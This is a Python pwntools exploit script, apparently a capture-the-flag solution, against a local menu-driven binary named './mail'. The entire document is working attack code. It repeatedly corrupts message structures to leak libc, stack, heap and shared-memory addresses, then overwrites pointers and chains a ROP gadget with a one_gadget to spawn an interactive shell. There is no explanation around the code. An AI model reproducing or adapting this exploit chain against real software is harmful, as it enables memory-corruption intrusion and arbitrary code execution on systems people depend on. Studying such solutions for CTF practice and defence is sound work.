from pwn import *

r = process('./mail')
bin = ELF('./mail')
libc = ELF('/usr/lib/x86_64-linux-gnu/libc-2.31.so')
context.clear(os='linux', arch='x86_64', log_level='DEBUG')

def create(name):
    r.sendlineafter(b'==================\n', b'0')
    r.sendlineafter(b"= Input account id =\n", name)

def login(name):
    r.sendlineafter(b'==================\n', b'1')
    r.sendlineafter(b"= Input account id =\n", name)

def sendmsg(msg, who):
    r.sendlineafter(b'==================\n', b'2')
    r.sendlineafter(b"= Input your message =\n", msg)
    r.sendlineafter(b"whom =\n", who)

def inbox(index):
    r.sendlineafter(b'==================\n', b'3')
    r.sendlineafter(b"index =\n", str(index).encode())
    if b'Inbox message' in r.recvline():
        return r.recvline()

def delete(index):
    r.sendlineafter(b'==================\n', b'4')
    r.sendlineafter(b"index =\n", str(index).encode())

def logout():
    r.sendlineafter(b'==================\n', b'5')

def debug():
    gdb.attach(r, '''b*0x4051e4''')

def overwrite(payload):
    logout()
    create(b"legoshi")
    login(b"legoshi")
    delete(0)

    sendmsg(payload, b"legoshi")
    time.sleep(0.1)
    inbox(0)

    r.send(b"2\nA\nlegoshi\n2\n" + b"A"*0x430 + b"\n")
    r.recvuntil(b"whom =")
    r.recvuntil(b"whom =")
    time.sleep(0.01)
    r.sendline(b"A")

    if inbox(1) == b'A':
        log.warning("Bad luck")
        r.close()
        exit()

    logout()
    create(b"a")
    login(b"a")

# leak libc
payload  = p64(bin.got["alarm"] - 8) + p64(bin.got["read"]) + p64(0x10) +\
            p64(next(bin.search(b"a\x00")))
overwrite(payload)
libc.address = u64(inbox(0)) - libc.symbols['read']
log.info('Libc base: %#x' % libc.address)
delete(0)

# leak stack
payload  = p64(bin.got["alarm"] - 8) + p64(libc.symbols["environ"]) + p64(0x10) +\
            p64(next(bin.search(b"a\x00")))

overwrite(payload)
addr_stack = u64(inbox(0)) - 0x138
log.info("stack = " + hex(addr_stack))
delete(0)

# leak heap
payload  = p64(bin.got["alarm"] - 8) + p64(addr_stack) + p64(0x10) +\
            p64(next(bin.search("a\0")))
overwrite(payload)
addr_heap = u64(inbox(0)) + 8
log.info("heap = " + hex(addr_heap))
delete(0)

# leak shm
payload  = p64(bin.got["alarm"] - 8) + p64(addr_heap + 1) + p64(0x10) +\
            p64(next(bin.search("a\0")))
overwrite(payload)
addr_shm = u64(inbox(0)) << 8
log.info("shm = " + hex(addr_shm))
delete(0)

# pwn
one_gadget = libc.address + 0xe3b31
rop_mov_rdx_prdiP8h_mov_prsp_rax_call_prdxP20h = libc.address + 0x001518b0
# pwn
payload  = p64(addr_shm + 0x40) + p64(addr_shm + 0x440) + p64(0) +\
            p64(next(bin.search(b"a\x00")))
overwrite(payload)
payload = p64(0) + p64(rop_mov_rdx_prdiP8h_mov_prsp_rax_call_prdxP20h)
sendmsg(p64(one_gadget) * 4, b"a")
inbox(1)
sendmsg(payload, "blegoshi")
delete(0)

r.interactive()
